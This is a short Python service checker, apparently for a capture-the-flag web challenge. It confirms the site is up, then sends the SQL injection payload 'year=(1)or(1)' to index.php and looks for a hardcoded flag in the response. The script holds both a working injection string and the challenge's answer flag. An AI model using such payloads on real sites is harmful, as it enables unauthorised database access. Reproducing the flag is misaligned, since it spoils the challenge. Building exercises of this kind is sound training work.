import requests

def check_web_sql1(host):

    flag = "FLAG{53cur3_5ql_a283b4dffe}"
    flag_url = host + "/index.php?year=(1)or(1)"

    try:
        res = requests.get(host, timeout=1.0)
        if res.status_code == 200:
            pass
        else:
            return 2
    except:
        return 2

    try:
        res = requests.get(flag_url, timeout=1.0)
        if res.status_code == 200 and flag in res.text:
            return 0
        else:
            return 1
    except:
        return 1
